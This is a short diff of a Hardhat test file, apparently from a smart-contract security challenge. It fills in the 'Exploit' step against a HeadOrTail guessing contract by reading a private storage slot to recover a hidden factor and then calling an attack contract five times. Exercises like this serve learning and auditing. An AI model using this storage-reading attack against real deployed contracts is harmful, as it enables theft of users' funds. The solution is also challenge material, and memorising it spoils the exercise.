@@ -18,6 +18,15 @@ describe(challengeName, function () {
 
   it("Exploit", async function () {
     /** CODE YOUR EXPLOIT HERE  */
+    // retrieving Factor from contract bytecode memory storage and invoking attack function 5 times
+    const HeadOrTailExploit = await ethers.getContractFactory("HeadOrTailExploit", alice);
+
+    this.exploit = await HeadOrTailExploit.deploy();
+
+    let factor = ethers.provider.getStorageAt(this.headOrTale.address, 2);
+    for(i = 0; i < 5; i++) {
+      await this.exploit.connect(bob).attack(this.headOrTale.address, factor);
+    }
   });
 
   after(async function () {
